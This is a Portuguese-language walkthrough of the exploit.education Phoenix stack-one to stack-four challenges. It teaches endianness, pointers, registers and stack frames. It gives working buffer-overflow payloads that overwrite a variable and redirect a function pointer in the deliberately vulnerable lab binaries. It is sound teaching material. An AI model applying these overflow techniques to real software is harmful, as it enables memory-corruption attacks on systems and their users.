<p>Em um sistema LE, os numeros s√£o representados em ordem crescente UDC.</p>
</blockquote>
<pre><code>Por exemplo, o numero cento e vinte tr√™s:
BE: 123        
LE: 321
</code></pre>
<p>No dia a dia, nos humanos usamos o sistema BE, mas os computadores preferem LE, ent√£o eles invertem a ordem dos 4 bytes nos numeros inteiros!</p>
<p>Ent√£o pra gente conseguir que changeme seja <code>BCDE</code>, a gente precisa passar <code>EDCB</code> pro computador! :D</p>
<pre><code>$ ./stack-one $(python -c &quot;print b'A' * 64 + 'EDCB'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Getting closer! changeme is currently 0x42434445, we want 0x496c5962
</code></pre>
<p>Isso quer dizer que pra gente definir <code>changeme = 49 6c 59 62</code>, e completar
o desafio, a gente precisa inverter a ordem dos bytes (<code>62 59 6c 49</code>)! :D</p>
<p>Mas eu n√£o sei que letras s√£o equivalentes a esses numeros... e nem todo numero tem uma letra!</p>
<h3 id="-dica-usando-valores-hex-diretamente"><a class="header" href="#-dica-usando-valores-hex-diretamente">üåô Dica: Usando valores hex diretamente</a></h3>
<p>Lembra que eu falei que letras s√£o valores hex? A gente tamb√©m pode usar os valores hex diretamente usando \x  :D</p>
<blockquote>
<p>Ent√£o usar b&quot;\x41&quot; √© igual a b&quot;A&quot;!</p>
</blockquote>
<pre><code>$ ./stack-one $(python -c &quot;print b'A' * 64 + b'\x62\x59\x6c\x49'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Well done, you have successfully set changeme to the correct value
</code></pre>
<p>Yay vitoria! </p>
<p>Caso voc√™ queira usar as letras, voce pode tamb√©m!</p>
<p>Ent√£o <code>b'\x62\x59\x6c\x49'</code> √© equivalente a <code>b'bYlI'</code></p>
<pre><code>$ ./stack-one $(python -c &quot;print b'A' * 64 + b'bYlI'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Well done, you have successfully set changeme to the correct value
</code></pre>
<p>Mas e nos casos que o byte n√£o tem um correspondente v√°lido? Vc usa <code>&quot;\x&quot;</code> :D</p>
<p>Na verdade, √© mais pr√°tico usar <code>\x</code> 99% das vezes, ent√£o vale a pena criar o habito!</p>
<h1 id="-solu√ß√£o-1"><a class="header" href="#-solu√ß√£o-1">üî• Solu√ß√£o</a></h1>
<blockquote>
<p>./stack-one $(python -c &quot;print b'A' * 64 + b'bYlI'&quot;)</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/phoenix/StackTwo.html#-objetivo">üéØ Objetivo</a></li>
<li><a href="stack/phoenix/StackTwo.html#-explica%C3%A7%C3%A3o">üí´ Explica√ß√£o</a>
<ul>
<li><a href="stack/phoenix/StackTwo.html#-environment-variable-vari%C3%A1vel-do-ambiente">üå≥ Environment Variable (Vari√°vel do ambiente)</a></li>
<li><a href="stack/phoenix/StackTwo.html#overflow">Overflow</a></li>
</ul>
</li>
<li><a href="stack/phoenix/StackTwo.html#-solu%C3%A7%C3%A3o">üî• Solu√ß√£o</a></li>
</ul>
<h1 id="-objetivo-1"><a class="header" href="#-objetivo-1">üéØ Objetivo</a></h1>
<p>Similar √† anterior, a gente precisa mudar o valor da vari√°vel changeme,
mas dessa vez ao inv√©s de usar o input ou argv, vamos usar env!</p>
<h1 id="-explica√ß√£o-2"><a class="header" href="#-explica√ß√£o-2">üí´ Explica√ß√£o</a></h1>
<p>Nesse desafio, o programa usa getenv(&quot;ExploitEducation&quot;) para ler uma
environment variable. </p>
<h2 id="-environment-variable-vari√°vel-do-ambiente"><a class="header" href="#-environment-variable-vari√°vel-do-ambiente">üå≥ Environment Variable (Vari√°vel do ambiente)</a></h2>
<p>Essas vari√°veis s√£o acess√≠veis para todos os programas
executando naquela se√ß√£o. E normalmente contem prefer√™ncias como cores, o tipo de terminal, etcetc....</p>
<p>Voc√™ pode checa-las usando</p>
<blockquote>
<p>$ env</p>
</blockquote>
<p>Voc√™ pode definir uma at√© o resto da se√ß√£o</p>
<blockquote>
<p>$ export Nome=Valor</p>
</blockquote>
<p>Voc√™ pode definir uma somente para execu√ß√£o daquele programa</p>
<blockquote>
<p>$ Nome=Valor ./stack-two</p>
</blockquote>
<p>Para n√≥s, n√£o faz tanta diferen√ßa se o input √© pelas <code>envs</code> ou por outro m√©todo.</p>
<p>O √∫nico problema √© que n√£o podemos usar o Null Byte (0x00), pois ele √© usado para indicar o final de uma string ASCII, portanto terminando nossa vari√°vel precocemente.</p>
<h2 id="overflow"><a class="header" href="#overflow">Overflow</a></h2>
<p>Em seguida, o valor √© copiado para um <code>buffer[64]</code> usando: <code>strcpy(buffer, ptr)</code>. Com <code>ptr</code> sendo o valor da <code>env</code> 'ExploitEducation'.</p>
<p>A fun√ß√£o <code>strcpy</code>, assim como <code>gets</code>, n√£o checa se o valor √© maior que o buffer, tornando o programa vulner√°vel... :(</p>
<p>Por ultimo, o programa checa se <code>changeme == 0x0d0a090a</code></p>
<blockquote>
<p>Levando em considera√ß√£o que o sistema √© LE: 0a 09 0a 0d</p>
</blockquote>
<p>Mas pera ai, checando o manual ASCII, esses caracteres s√£o usados para encerrar linha, n√£o √© uma letra do teclado! D:</p>
<p>Pois √©, ent√£o vamos precisar usar os bytes diretamente.</p>
<pre><code>Se voc√™ quer tentar resolver sozinhe, agora √© a sua hora!

.
.
.
.
.
.
.
.
.
.
.
.
.
</code></pre>
<p>Eu precisei colocar em caixinhas diferentes para caber na tela :(</p>
<blockquote>
<p>$ ExploitEducation=$(python -c &quot;print b'A'*64 + b'\x0a\x09\x0a\x0d'&quot;) ./stack-two </p>
</blockquote>
<pre><code>Welcome to phoenix/stack-two, brought to you by exploit.education
Well done, you have successfully set changeme to the correct value
</code></pre>
<p>Uhuuu, esse foi mais f√°cil :D</p>
<h1 id="-solu√ß√£o-2"><a class="header" href="#-solu√ß√£o-2">üî• Solu√ß√£o</a></h1>
<blockquote>
<p>$ ExploitEducation=$(python -c &quot;print b'A'*64 + b'\x0a\x09\x0a\x0d'&quot;) ./stack-two</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/phoenix/StackThree.html#-objetivo">üéØ Objetivo</a></li>
<li><a href="stack/phoenix/StackThree.html#-dica">üí° Dica</a></li>
<li><a href="stack/phoenix/StackThree.html#-explica%C3%A7%C3%A3o">üí´ Explica√ß√£o</a>
<ul>
<li><a href="stack/phoenix/StackThree.html#%EF%B8%8F%EF%B8%8F-o-que-raios-s%C3%A3o-pointers">‚ÜóÔ∏è‚ÜòÔ∏è O que raios s√£o pointers</a></li>
<li><a href="stack/phoenix/StackThree.html#-function-pointers">ü¶Ä Function Pointers</a></li>
<li><a href="stack/phoenix/StackThree.html#-exploit">üî• Exploit</a>
<ul>
<li><a href="stack/phoenix/StackThree.html#-analisando-o-programa">üõ∏ Analisando o programa</a></li>
<li><a href="stack/phoenix/StackThree.html#-encontrando-o-endere%C3%A7o-da-fun%C3%A7%C3%A3o">üè† Encontrando o endere√ßo da fun√ß√£o</a></li>
<li><a href="stack/phoenix/StackThree.html#-cansei-de-teoria-eu-quero-exploit">üòê Cansei de teoria eu quero exploit</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="stack/phoenix/StackThree.html#-solu%C3%A7%C3%A3o">üî• Solu√ß√£o</a></li>
</ul>
<h1 id="-objetivo-2"><a class="header" href="#-objetivo-2">üéØ Objetivo</a></h1>
<p>Usar um pointer para retornar para uma fun√ß√£o pre existente</p>
<h1 id="-dica-1"><a class="header" href="#-dica-1">üí° Dica</a></h1>
<p>OBS: em Ingles! // <a href="https://en.wikipedia.org/wiki/Pointer_(computer_programming)">Wikipedia Pointer</a></p>
<h1 id="-explica√ß√£o-3"><a class="header" href="#-explica√ß√£o-3">üí´ Explica√ß√£o</a></h1>
<ul>
<li>O que raios s√£o pointers</li>
<li>Function pointers</li>
<li>Exploit</li>
</ul>
<h3 id="-o-que-raios-s√£o-pointers"><a class="header" href="#-o-que-raios-s√£o-pointers">‚ÜóÔ∏è‚ÜòÔ∏è O que raios s√£o pointers</a></h3>
<blockquote>
<p>Pointers s√£o uma estrutura que, ao inv√©s de armazenar dados, armazena o endere√ßo de outra estrutura.
Lembra do exemplo do po√ßo? Que cada item tinha seu endere√ßo na stack! Ent√£o, um pointer armazena esse endere√ßo! :D</p>
</blockquote>
<p>O pointer pode ser visto como uma placa na estrada, indicando que X cidade est√° em Y dire√ß√£o.</p>
<p>Colunas: Nome da Vari√°vel | Endere√ßo | conte√∫do</p>
<p><img src="stack/phoenix/./img/pointer.png" alt="Imagem da wikipedia mostrando um pointer" /></p>
<p>A vari√°vel &quot;a&quot; √© um pointer que armazena a localiza√ß√£o da vari√°vel &quot;b&quot;. Coloquialmente se diz que: &quot;a&quot; est√° apontando para &quot;b&quot; (seta vermelha).</p>
<blockquote>
<p>&quot;a&quot; armazena uma referencia √° &quot;b&quot; !</p>
</blockquote>
<blockquote>
<p>&quot;a&quot; pode ser des-referenciada, isto √©: Seguir a dire√ß√£o que &quot;a&quot; aponta, para chegar no valor de &quot;b&quot; ! :D</p>
</blockquote>
<p>Normalmente, o caracteres &quot;&amp;&quot; indica uma refer√™ncia, e o caracteres &quot;*&quot; desreferencia aquele pointer.</p>
<blockquote>
<p>Caso voc√™ tente desrefenciar um pointer que n√£o aponta pra nada (NULL),
o programa vai interromper a execu√ß√£o e soltar uma mensagem de erro!
Ou vai ser classificado como &quot;comportamento indefinido&quot;! Por isso, voc√™ vai ver &quot;Null Checks&quot; 
bem frequentemente nesses desafios e em programas em geral!</p>
</blockquote>
<h3 id="-function-pointers"><a class="header" href="#-function-pointers">ü¶Ä Function Pointers</a></h3>
<blockquote>
<p>Function pointers, ao inv√©s de armazenar o endere√ßo de uma vari√°vel, armazenam o endere√ßo de uma fun√ß√£o! :D</p>
</blockquote>
<p>Sim! Fun√ß√µes tamb√©m s√£o armazenadas na Stack, e possuem seu endere√ßo! Esse endere√ßo pode ser encontrado por v√°rios m√©todos:</p>
<pre><code>objdump -d &lt;programa&gt; | grep &lt;nome_da_fun√ß√£o&gt;


gdb &lt;programa&gt;
  (gdb)&gt; info functions
</code></pre>
<p>Os dois m√©todos ser√£o demonstrados em breve! :D</p>
<h3 id="-exploit"><a class="header" href="#-exploit">üî• Exploit</a></h3>
<blockquote>
<p>Buffer overflow, alterando o valor de um function pointer, redirecionando a execu√ß√£o do programa.</p>
<p>Em lingua n√£o nerd, por favor? :P</p>
<p>O valor que sera corrompido pelo buffer overflow indica aonde a execu√ß√£o do programa esta indo. Se controlamos esse valor, controlamos aonde o programa vai!</p>
</blockquote>
<h4 id="-analisando-o-programa"><a class="header" href="#-analisando-o-programa">üõ∏ Analisando o programa</a></h4>
<pre><code class="language-C">fun√ß√£o complete_level() {   // a fun√ß√£o que a gente quer chamar
.......
}

fun√ß√£o main() {
  criar buffer[64];
  criar fp; // um function pointer
  
  fp = NULL; // vai ser usado para checar se ele foi alterado,
               // se continuar sendo NULL, quer dizer que esta intacto.
                
  
  gets(buffer) // fun√ß√£o INSEGURA para abrir um input
  
  if (fp) {    // se fp foi alterado
    fp()   // chama o endere√ßo salvo em fp como se fosse uma fun√ß√£o
  } else {
    print(valor nao alterado, tente novamente)
  }
  
  exit
}
</code></pre>
<p>N√≥s queremos chamar <code>complete_level()</code>, para isso, faremos <code>fp</code> salvar o seu endere√ßo.</p>
<p>E n√≥s j√° sabemos como exploitar um <code>gets()</code> para alterar os valores depois do <code>buffer</code>! Ent√£o t√° na hora do trabalho!</p>
<h4 id="-encontrando-o-endere√ßo-da-fun√ß√£o"><a class="header" href="#-encontrando-o-endere√ßo-da-fun√ß√£o">üè† Encontrando o endere√ßo da fun√ß√£o</a></h4>
<pre><code>objdump -d    // Resumindo, printa pro terminal os objetos armazenados na Stack e seus endere√ßos
                  ( O -d √© pra ativar a disassembly: Converter de machine code para algo leg√≠vel )!
gdb
</code></pre>
<p>objdump</p>
<pre><code>$ objdump -d /opt/phoenix/amd64/stack-three | grep complete_level
000000000040069d &lt;complete_level&gt;:
</code></pre>
<p>gdb</p>
<pre><code class="language-x86asm">$ gdb /opt/phoenix/amd64/stack-three                
---- Mensagens padr√£o foram removidas ----
(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x00000000004004b0  _init
0x00000000004004d0  printf@plt
0x00000000004004e0  gets@plt
0x00000000004004f0  puts@plt
0x0000000000400500  fflush@plt
0x0000000000400510  exit@plt
0x0000000000400520  __libc_start_main@plt
0x0000000000400530  _start
0x0000000000400546  _start_c
0x0000000000400570  deregister_tm_clones
0x00000000004005a0  register_tm_clones
0x00000000004005e0  __do_global_dtors_aux
0x0000000000400670  frame_dummy
0x000000000040069d  complete_level              // Mesmo endere√ßo
0x00000000004006b5  main
0x0000000000400740  __do_global_ctors_aux
0x0000000000400782  _fini
</code></pre>
<blockquote>
<p>O endere√ßo da fun√ß√£o √© 0x000000000040069d ! :D</p>
</blockquote>
<p>Presta aten√ß√£o na quantidade de null bytes que precedem o endere√ßo. Todo pointer come√ßa com pelo menos dois null bytes, 
e strings terminam com 1 null byte!</p>
<p>Assim, impedindo atacantes (n√≥s), de definir um pointer novo, pois quebraria a string do nosso 
input. N√≥s precisamos usar um que j√° esta na memoria! (  Spoiler hehehehe :D  )</p>
<p>Como nesse desafio o pointer ja existe (<code>fp</code>) e n√≥s s√≥ vamos mudar os bytes finais dele
(Inteiro escreve na dire√ß√£o LE, lembra? Ent√£o n√£o vai interferir com os NULLs que vem antes)</p>
<p>Portanto n√£o precisamos nos preocupar com isso nesse desafio!</p>
<h4 id="-cansei-de-teoria-eu-quero-exploit"><a class="header" href="#-cansei-de-teoria-eu-quero-exploit">üòê Cansei de teoria eu quero exploit</a></h4>
<p>Se voc√™ quer tentar por conta pr√≥pria, agora √© sua hora de brilhar!</p>
<pre><code>Lembretes:
Little Endian, o buffer tem 64 bytes,
b&quot;\x&quot;, e o input vem pelo gets()
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
eai, brilhou? ;)
</code></pre>
<p>O input que vamos passar fica:
b&quot;A&quot;*64     # encher o buffer (<code>padding</code>) <br />
+ <br />
b&quot;\x9d\x06\x40&quot; # 0x40069d vira &quot;9d 06 40&quot; em LE</p>
<p>Ent√£o...</p>
<blockquote>
<p>$ python -c &quot;print(b'A'*64 + b'\x9d\x06\x40')&quot;</p>
</blockquote>
<pre><code class="language-C">calling function pointer @ 0x40069d &lt;-- chamando complete_level()
Congratulations, you've finished phoenix/stack-three :-) Well done!
</code></pre>
<p>Espero que voc√™ tenha gostado! :D</p>
<h1 id="-solu√ß√£o-3"><a class="header" href="#-solu√ß√£o-3">üî• Solu√ß√£o</a></h1>
<blockquote>
<p>$ python -c &quot;print(b'A'*64 + b'\x9d\x06\x40')&quot; | /opt/phoenix/amd64/stack-three </p>
</blockquote>
<pre><code>calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/phoenix/StackFour.html#-objetivo">üéØ Objetivo</a></li>
<li><a href="stack/phoenix/StackFour.html#-conhecimento-preliminar">üõ∏ Conhecimento preliminar</a>
<ul>
<li><a href="stack/phoenix/StackFour.html#-assembly">ü§ñ Assembly</a>
<ul>
<li><a href="stack/phoenix/StackFour.html#-register-registos--registadores">üì¶ Register (Registos / Registadores)</a>
<ul>
<li><a href="stack/phoenix/StackFour.html#-general-purpose-registers-gpr--registo-de-prop%C3%B3sito-geral-">üåç General Purpose Registers (GPR) ( Registo de Prop√≥sito Geral )</a></li>
<li><a href="stack/phoenix/StackFour.html#-address-register--armazenam-endere%C3%A7os-da-stack-">üí´ Address Register ( armazenam endere√ßos da stack )</a></li>
<li><a href="stack/phoenix/StackFour.html#-rflag">üèÅ RFLAG</a></li>
<li><a href="stack/phoenix/StackFour.html#-ap%C3%AAndice---curiosidade--nomenclatura-hist%C3%B3rica">üß† Ap√™ndice - Curiosidade : Nomenclatura hist√≥rica</a></li>
</ul>
</li>
<li><a href="stack/phoenix/StackFour.html#-instru%C3%A7%C3%B5es">‚ö° Instru√ß√µes</a></li>
<li><a href="stack/phoenix/StackFour.html#-fun%C3%A7%C3%B5es-pr%C3%B3logo-e-ep%C3%ADlogo">ü¶Ñ Fun√ß√µes, Pr√≥logo e Ep√≠logo</a>
<ul>
<li><a href="stack/phoenix/StackFour.html#-revis%C3%A3o">‚òï Revis√£o</a></li>
<li><a href="stack/phoenix/StackFour.html#%EF%B8%8F-stack-frame--moldura-da-stack-">üñºÔ∏è Stack Frame ( Moldura da Stack )</a></li>
<li><a href="stack/phoenix/StackFour.html#-pr%C3%B3logo">üîí Pr√≥logo</a>
<ul>
<li><a href="stack/phoenix/StackFour.html#se-a-fun%C3%A7%C3%A3o-receber-argumentos-salvar-eles">Se a fun√ß√£o receber argumentos, salvar eles</a></li>
</ul>
</li>
<li><a href="stack/phoenix/StackFour.html#salvar-o-frame-atual">Salvar o frame atual</a></li>
<li><a href="stack/phoenix/StackFour.html#criar-novo-frame">Criar novo frame</a></li>
<li><a href="stack/phoenix/StackFour.html#-ep%C3%ADlogo">üîë Ep√≠logo</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="stack/phoenix/StackFour.html#-caso-voc%C3%AA-tenha-viajado-o-que-voc%C3%AA-precisa-saber">üåç Caso voc√™ tenha viajado, o que voc√™ precisa saber</a></li>
<li><a href="stack/phoenix/StackFour.html#-exploit">üî• Exploit</a>
<ul>
<li><a href="stack/phoenix/StackFour.html#-analisar-o-programa">üî¨ Analisar o programa</a></li>
<li><a href="stack/phoenix/StackFour.html#%EF%B8%8F-o-compilador-adicionou-coisa">‚ÅâÔ∏è O compilador adicionou coisa???</a></li>
<li><a href="stack/phoenix/StackFour.html#-encontrar-endere%C3%A7o-de-complete_level">üè† Encontrar endere√ßo de complete_level</a></li>
</ul>
</li>
<li><a href="stack/phoenix/StackFour.html#-solu%C3%A7%C3%A3o">üí´ Solu√ß√£o</a></li>
</ul>
<h1 id="-objetivo-3"><a class="header" href="#-objetivo-3">üéØ Objetivo</a></h1>
<p>O buffer overflow (<code>BOF</code>) vai nos permitir alterar o saved return pointer (<code>SRP</code>) e redirecionar a execu√ß√£o do programa.</p>
<p>Esse desafio est√° nos preparando para o pr√≥ximo, no qual nos redirecionaremos a execu√ß√£o para o nosso pr√≥prio c√≥digo, e teremos um exploit de verdade! :D</p>
<p>Esse tipo de exploit era vi√°vel nos anos 90, quando mecanismos de prote√ß√£o n√£o existiam. Por isso √© chamado de buffer overflow cl√°ssico (ou <code>SRP BOF</code>, 
caso voc√™ goste de siglas)! :D</p>
<p>Se voc√™ souber ingl√™s, vale a pena dar uma lida nesse post de 1996 no Phrack: <a href="http://phrack.org/issues/49/14.html">Smashing The Stack For Fun And Profit</a> !</p>
<h1 id="-conhecimento-preliminar"><a class="header" href="#-conhecimento-preliminar">üõ∏ Conhecimento preliminar</a></h1>
<p>Se tem uma se√ß√£o inteira dedicada a conhecimento preliminar, eu posso te garantir que vai ser BASTANTE ! Verifique que o cinto de seguran√ßa est√° firme e travado,
mantenha as m√£os, pernas e canecas de caf√© dentro do ve√≠culo durante todo o percurso!</p>
<p>3...2...1....</p>
<h2 id="-assembly"><a class="header" href="#-assembly">ü§ñ Assembly</a></h2>
<p>Recursos adicionais: <br />
<a href="https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf&amp;ved=2ahUKEwiPvJn2xvrsAhXIILkGHdA4BNUQFjAAegQIARAB&amp;usg=AOvVaw384MVXQDBtyM1pPW3LeZrW">x64 Cheat Sheet - PDF</a> <br />
<a href="https://cs61.seas.harvard.edu/site/2018/Asm1/">Harvard CS61</a> <br />
<a href="https://en.m.wikipedia.org/wiki/Processor_register">Wikipedia Registers</a> <br />
<a href="https://www.tutorialspoint.com/general-purpose-registers-in-8086-microprocessor#:%7E:text=The%20general%20purpose%20registers%20are,has%20eight%20general%20purpose%20registers.&amp;text=This%20is%20the%20accumulator.,into%20two%208%2Dbit%20registers">GPR in 8086</a><br />
<a href="https://mentebinaria.gitbook.io/engenharia-reversa/assembly/registradores">Registadores - Introdu√ß√£o Engenharia Reversa</a> </p>
<p>Eu pretendo fazer uma serie de tutorias dedicada √† assembly (ASM), por√©m isso √© para o futuro...</p>
<p>Eu vou usar sintaxe intel, pq √© a melhor e se algu√©m te disser o contr√°rio, a pessoa ta mentindo &gt;:( !!!!</p>
<blockquote>
<p>ASM √© uma representa√ß√£o leg√≠vel dos 0s e 1s das instru√ß√µes do computador.
Ela pode ser transformada em machine code (c√≥digo de maquina, os 0s e 1s) usando uma ferramenta chamada assembler!</p>
</blockquote>
<p>Ent√£o como voc√™ pode imaginar, √© bem complicado, e a minha maneira de explicar pode n√£o funcionar para voc√™... Ent√£o vai com calma, le de outras fontes, assiste 
videos,... vai demorar um bom tempo ate ficar intuitivo, e ta tudo bem com isso :) vai no seu ritmo</p>
<h3 id="-register-registos--registadores"><a class="header" href="#-register-registos--registadores">üì¶ Register (Registos / Registadores)</a></h3>
<blockquote>
<p>Registers s√£o peda√ßos de mem√≥ria que ficam dentro do chip do processador,
semelhante a mem√≥ria RAM, por√©m extremamente r√°pidos e pequenos.</p>
</blockquote>
<p>O seu tamanho √© um dos determinantes da arquitetura (32 bits = register de
4 bytes, 64 bits = register de 8 bytes)</p>
<p>Esses registers s√£o semelhantes √† vari√°veis, no sentido que
armazenam valores, podem ser alterados e lidos.</p>
<h4 id="-general-purpose-registers-gpr--registo-de-prop√≥sito-geral-"><a class="header" href="#-general-purpose-registers-gpr--registo-de-prop√≥sito-geral-">üåç General Purpose Registers (GPR) ( Registo de Prop√≥sito Geral )</a></h4>
<p>Obs: muitos desses podem ser divididos em 2 partes, com metade do tamanho original. Nesse caso, se adiciona o sufixo H (High, A parte de cima) e L (Low, A parte de baixo). </p>
<blockquote>
<p>Por exemplo: AX (16 bits, endere√ßos: 0 a 15) (uma vers√£o antiga do RAX) pode ser dividido em AL (8 bits, do 0 ao 7) e AH (8 bits, do 8 ao 15).</p>
</blockquote>
<p>O prop√≥sito deles historicamente costumava ser, mas n√£o exclusivamente era:</p>
<pre><code class="language-x86asm">RAX Acumulador   -&gt; Usado para opera√ß√µes_l√≥gicas ou aritm√©ticas 
RBX              -&gt; Pointer para dados
RCX Contagem     -&gt; Usado em loops e outras opera√ß√µes_c√≠clicas 
RDX Dados        -&gt; Multiplica√ß√£o, input/output
R8 a 15          -&gt; voc√™ s√≥ precisa saber que eles existem
</code></pre>
<p>Alem disso, s√£o usados para passar os argumentos para fun√ß√µes (explica√ß√£o em breve)</p>
<pre><code class="language-x86asm">RAX (Valor retornado)
RDI (1¬∫ par√¢metro)
RSI (2¬∫ par√¢metro)
RDX (3¬∫ par√¢metro)
...
</code></pre>
<p>Para os nossos prop√≥sitos, √© mais vantajoso considerar que eles s√≥ servem para 
armazenar valores e passar argumentos</p>
<h4 id="-address-register--armazenam-endere√ßos-da-stack-"><a class="header" href="#-address-register--armazenam-endere√ßos-da-stack-">üí´ Address Register ( armazenam endere√ßos da stack )</a></h4>
<pre><code class="language-x86asm">RSP Stack Pointer       -&gt; Aponta para o topo da stack
RBP Base Pointer        -&gt; Aponta para a base da stack
RIP Instruction Pointer -&gt; Aponta para a instru√ß√£o 
								que est√° sendo executada 
</code></pre>
<h4 id="-rflag"><a class="header" href="#-rflag">üèÅ RFLAG</a></h4>
<p>O register RFLAG armazena flags: sinais que indicam resultados de opera√ß√µes passadas.
Esses sinais s√£o 1 bit (0 ou 1)</p>
<pre><code>Exemplos:

Posi√ß√£o    Nome         Descri√ß√£o 
0          Carry         Resultado estourou o limite de um inteiro
								sem sinal (o &quot;vai-um&quot; da matem√°tica)
6          Zero          A opera√ß√£o resultou em 0
11         Overflow      Estourou o limite de um inteiro com sinal
</code></pre>
<h4 id="-ap√™ndice---curiosidade--nomenclatura-hist√≥rica"><a class="header" href="#-ap√™ndice---curiosidade--nomenclatura-hist√≥rica">üß† Ap√™ndice - Curiosidade : Nomenclatura hist√≥rica</a></h4>
<p><img src="stack/phoenix/./img/registers.jpeg" alt="Imagem mostrando os registers" /> <br />
Eu vou usar o RAX como exemplo!</p>
<pre><code class="language-x86asm">Em computadores 8 bits, ele era chamado A (Acumulador)
Em computadores 16 bits, ele era chamado AX (Acumulador eXtendido ) 
Em computadores 32 bits, ele era chamado EAX e tem o tamanho de 2 AX
Em computadores 64 bits, ele √© chamado RAX e tem o tamanho de 2 EAX

Para prop√≥sitos de retro-compatibilidade, nos ainda podemos usar, 
por exemplo, EAX em um computador 64 bits !
Por tr√°s das cenas, o computador interpreta EAX como a segunda metade do RAX

Ent√£o n√£o estranhe caso algu√©m fale de EIP numa
arquitetura x64, pois na linguagem informal n√£o faz diferen√ßa

Mas caso voc√™ v√° analisar o register em um debugger, a diferen√ßa importa :D
</code></pre>
<h3 id="-instru√ß√µes"><a class="header" href="#-instru√ß√µes">‚ö° Instru√ß√µes</a></h3>
<blockquote>
<p>Obs: os registers foram usados aleatoriamente, pois seu prop√≥sito na realidade n√£o √© relevante para a explica√ß√£o !</p>
</blockquote>
<p>As instru√ß√µes s√£o o que o processador executa, por exemplo</p>
<pre><code class="language-x86asm">add 0x4 0x1     -&gt; adi√ß√£o 4 + 1 = 5
</code></pre>
<p>Na sintaxe intel, o &quot;alvo&quot; da opera√ß√£o vem primeiro e o &quot;par√¢metro&quot; depois</p>
<p>Caso os dois argumentos da instru√ß√£o sejam valores, a opera√ß√£o executara normalmente</p>
<p>Caso o <strong>alvo</strong> seja um <strong>register</strong>, o <strong>resultado</strong> da opera√ß√£o ser√° salvo nele </p>
<pre><code class="language-x86asm">add 0x4 0x1     -&gt; adi√ß√£o 4 + 1 = 5
add rbp 0x10    -&gt; rbp  vira  rbp + 0x10
add rbp 0x22    -&gt; Adiciona 0x22 ao rbp 
</code></pre>
<pre><code class="language-x86asm">sub 0x4 0x1     -&gt; subtra√ß√£o 4 - 1 = 3
                 Caso fosse ao contr√°rio a ordem &quot;alvo&quot; &quot;par√¢metro&quot;,
                 o resultado seria `-3` !
                 
sub rbp 0x10    -&gt; rbp  vira  rbp - 0x10
sub rsp 0x10    -&gt; Subtrai 0x10 de rsp
</code></pre>
<p>Algumas outras instru√ß√µes que ser√£o importantes</p>
<pre><code class="language-x86asm">push -&gt; Empurra o valor pro topo da Stack

pop  -&gt; Tira o valor no topo da Stack e salva no alvo
     |---&gt; pop      -&gt; S√≥ remove o valor no topo da Stack
     |---&gt; pop rbp  -&gt; Remove o valor do topo e salva em rbp
      
mov  -&gt; Move o valor do par√¢metro para o alvo
     |---&gt; mov rbx 0x10   -&gt; O valor de rbx vira 0x10
     |---&gt; mov rbx rax    -&gt; O valor de rbx vira o valor de rax
     |---&gt; mov rax rbx    -&gt; O valor de rax vira o valor de rbx

Usadas no ep√≠logo ( explicadas em breve )
           ret     -&gt; retorna da fun√ß√£o ( em ess√™ncia √© s√≥ um &quot;pop rip&quot; )
           leave -&gt; restaura o stack frame anterior ( mov rsp rbp ; pop rbp )

xor, and, ......  -&gt; Operadores l√≥gicos, t√™m o mesmo comportamento de sub e add
                  |---&gt; and rbp 0x10   -&gt; rbp  vira  rbp &amp; 0x10
                  |---&gt; xor rsp 0x10   -&gt; rsp  vira  rsp ^ 0x10

Jumps/Pulos
jmp 0x00001234 -&gt; Move o RIP para aquela localiza√ß√£o incondicionalmente,
			equivalente a um GOTO

test rax 0x1 ; jmpEQ 0x00001234 -&gt; jmp equal
             |---&gt; Compara os valores; Se forem iguais da o jump
			 (normalmente usado em conjunto com a ZERO_FLAG)

jmple  -&gt; jmp less or equal   -&gt; Menor ou igual   ‚â§
jmpge -&gt; jmp greater or equal -&gt; Maior ou igual   ‚â•
</code></pre>
<p>Caso vc n√£o saiba os operadores l√≥gicos: <a href="https://pt.wikipedia.org/wiki/Operador_l%C3%B3gico">Wikipedia Operador L√≥gico</a></p>
<h3 id="-fun√ß√µes-pr√≥logo-e-ep√≠logo"><a class="header" href="#-fun√ß√µes-pr√≥logo-e-ep√≠logo">ü¶Ñ Fun√ß√µes, Pr√≥logo e Ep√≠logo</a></h3>
<p>Agora t√° na hora de aprender <strong>realmente</strong> como essa tal de stack funciona, ent√£o √© bom dar uma revisada, n√©?</p>
<h4 id="-revis√£o"><a class="header" href="#-revis√£o">‚òï Revis√£o</a></h4>
<pre><code>- A stack √© como uma pilha de pratos: √∫ltimo a entrar, primeiro a sair (LIFO)
- Ela cresce para valores menores: 
    - A mem√≥ria √© representada de cabe√ßa pra baixo!
    - A base fica em um endere√ßo maior (parte de baixo)
    - O topo fica em um endere√ßo menor (parte de cima)
    - Portanto, a stack cresce em dire√ß√£o √† valores menores :D 

</code></pre>
<h4 id="-stack-frame--moldura-da-stack-"><a class="header" href="#-stack-frame--moldura-da-stack-">üñºÔ∏è Stack Frame ( Moldura da Stack )</a></h4>
<p>Voc√™ se lembra do RBP e RSP la da parte dos register? Eles ficam importantes agora! :D</p>
<p>O rbp indica a base da stack, e rsp o topo.</p>
<p>A regi√£o entre os dois √© chamada de stack frame: um peda√ßo da stack :D</p>
<p>A stack como um todo possui v√°rios stack frames, por√©m s√≥ um est√° ativo por vez (o indicado pelo rbp/rsp).</p>
<p>Para poder criar um novo ou destruir um antigo, existem procedimentos chamados Pr√≥logo e Ep√≠logo, respectivamente.</p>
<blockquote>
<p>Obs: Quando voc√™ muda o tamanho da stack por push/pop, o RSP se ajusta automaticamente </p>
</blockquote>
<p>Quando chamamos uma <strong>fun√ß√£o()</strong>, precisamos criar um frame novo para ela por meio de um Pr√≥logo, e salvar o endere√ßo do frame atual. Ao retornar, esse frame ser√° destru√≠do com um Ep√≠logo e o antigo ser√° restaurado !</p>
